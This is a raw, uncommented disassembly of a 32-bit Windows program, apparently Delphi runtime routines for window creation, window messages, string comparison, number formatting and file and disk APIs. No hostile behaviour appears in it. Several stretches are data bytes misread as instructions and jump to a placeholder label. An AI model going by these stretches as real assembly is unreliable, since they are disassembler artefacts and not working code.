imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
dec esp
pop edi
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x25ffc0 ] cl
add eax [ edi ]
mov eax eax
jmp [ DeleteCriticalSection@IAT ]
mov eax eax
jmp [ FormatMessageA@IAT ]
add ebx [ eax - 0x74ffbfa2 ]
sar bh 0x25
or [ edx ] al
inc edi
add [ ebx + 0x425ffc0 ] cl
add al [ edi ]
mov eax eax
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
sub_4069c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a60
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a50
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406a1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a60
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a50
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406a74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406b69
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406b91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406b98
retn
sub_406ba4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406bc9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406bd0
retn
sub_406bdc
test [ fs : esi ] 0xf0
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add cl dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dl dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bl dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ah dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ch dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dh dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bh dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add al bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add cl bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dl bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bl bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ah bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ch bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dh bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bh bh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add al ah
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add cl ah
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dl ah
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bl ah
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ah ah
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ch ah
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dh ah
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bh ah
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add al ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add cl ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dl ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bl ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ah ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ch ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dh ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bh ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add al dl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add cl dl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dl dl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bl dl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ah dl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ch dl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dh dl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bh dl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add al bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add cl bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dl bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bl bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ah bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ch bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dh bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bh bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add al al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add cl al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dl al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bl al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ah al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ch al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dh al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bh al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add al cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add cl cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dl cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bl cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ah cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ch cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dh cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bh cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ eax + 0x640000ff ] dh
test [ esi ] 0xb1
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edx + 0x640000ff ] dh
test [ esi ] 0xb3
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + edi * 8 - 0x99c0000 ] dh
inc esi
add [ ebp + 0x640000ff ] dh
test [ esi ] 0xb6
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] dh
test [ esi ] 0xb8
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] bh
test [ esi ] 0xba
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx + 0x640000ff ] bh
test [ esi ] 0xbc
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebp + 0x640000ff ] bh
test [ esi ] 0xbe
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] bh
test [ esi ] 0xa0
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] ah
test [ esi ] 0xa2
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx + 0x640000ff ] ah
test [ esi ] 0xa4
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebp + 0x640000ff ] ah
test [ esi ] 0xa6
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + 0x640000ff ] ah
test [ esi ] 0xa8
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx + 0x640000ff ] ch
test [ esi ] 0xaa
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406ed9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406ee0
retn
sub_4079d8
mov ecx 0xc3004079
jns r-xdata
add [ eax ] al
add [ eax ] al
add ch cl
jns r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx - 0x5effbf87 ] bl
jns r-xdata
stosd [ edi ]
push edx
popad
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx - 0x4effbf87 ] ch
jns r-xdata
insb
jne r-xdata
add [ eax + 0x7a ] ah
inc eax
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x34b40040 ] dl
inc eax
add [ eax - 0x4bffbfaa ] ch
push esi
inc eax
add al cl
xor al 0x40
add [ esp + esi + 0x56c40040 ] bh
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
retn
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x4079d83f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
jpe r-xdata
xor al 0xd1
inc esi
add [ ebx + 0x34158910 ] cl
rol [ esi ] 0x1
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
arpl [ eax + 0x72 ] bp
outsd
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
adc [ ecx + 0x46d13415 ] cl
add [ ebx + 0x46de8c15 ] cl
add [ ebx + 0xa890448 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] ah
xor al [ eax ]
xor al 0xcb
add ah dh
jns r-xdata
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ ebx + ecx * 8 ] dh
add [ eax ] al
add [ eax ] al
sub_407a88
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407aa4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
call sub_4039f8
pop edi
pop esi
pop ebx
retn
sub_407ac8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026bc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402c88
mov eax esi
pop esi
pop ebx
retn
sub_407ae8
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
sub_407b14
push ebx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407ae8
pop ebx
retn
sub_407b4c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40427c
mov ebx eax
mov eax edi
mov edx ebx
call sub_404608
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407b88
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40427c
mov ebx eax
mov eax edi
mov edx ebx
call sub_404608
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407bc4
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407bf4
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407c14
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407c68
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407c14
test eax eax
jne r-xdata
sub_407c8c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40427c
mov ebx eax
mov eax esi
call sub_40447c
mov edx eax
mov eax edi
mov ecx ebx
call sub_4040ac
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_407cc0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40427c
mov ebx eax
mov eax esi
call sub_40447c
mov edx eax
mov eax edi
mov ecx ebx
call sub_4040ac
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_407cf4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40427c
push eax
mov eax esi
call sub_40447c
push eax
mov eax ebx
call sub_40427c
push eax
mov eax ebx
call sub_40447c
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407d2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40427c
push eax
mov eax esi
call sub_40447c
push eax
mov eax ebx
call sub_40427c
push eax
mov eax ebx
call sub_40447c
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407d7c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407d9c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_40427c
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403fbc
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_4044dc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407dec
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_40427c
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_40427c
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407e50
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407e66
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407e66
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407e66
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407e9c
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407e50
mov edx esi
pop eax
call sub_4040ac
add esp 0x10
pop esi
retn
sub_407ebc
or cl cl
jne sub_407ef0
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407ef0
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407ef0
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407ef0
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407f88
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407ebc
mov edx esi
pop eax
call sub_4040ac
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_407fb0
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407e50
mov edx esi
pop eax
call sub_4040ac
add esp 0x20
pop esi
retn
xor edx edx
sub_407fd8
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402ca8
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407aa4
sub_40802c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402ca8
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_40804c
mov eax [ rw-data ]
call sub_404db4
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404db4
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f70
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404010
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f70
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404010
sub_4080dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407d64
test al al
je r-xdata
sub_408118
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409320
mov edx eax
test dl dl
je r-xdata
call sub_40804c
push ebp
mov eax [ rw-data ]
call sub_404dbc
mov edx eax
mov eax [ rw-data ]
call sub_4080dc
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404dbc
mov edx eax
mov eax [ rw-data ]
call sub_4080dc
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4081b4
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404010
call sub_40804c
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_404010
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_404010
jmp r-xdata
pop esi
pop ebx
retn
sub_408200
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_40447c
push eax
call CreateFileA
sub_408258
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_40447c
push eax
call CreateFileA
pop ebx
retn
sub_408284
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4082b0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4082dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40831c
push ebx
push esi
mov esi eax
mov eax esi
call sub_40427c
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40bdc8
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_40834c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_40427c
mov edi eax
mov eax ebx
call sub_40447c
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408650
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40bdc8
cmp al 0x2
jne r-xdata
dec edi
sub_40839c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_40834c
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_4044dc
pop edi
pop esi
pop ebx
retn
sub_4083d4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40834c
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403fbc
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_4044dc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40841c
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_40447c
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_4040ac
add esp 0x108
pop esi
pop ebx
retn
sub_408458
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404d90
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404d90
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
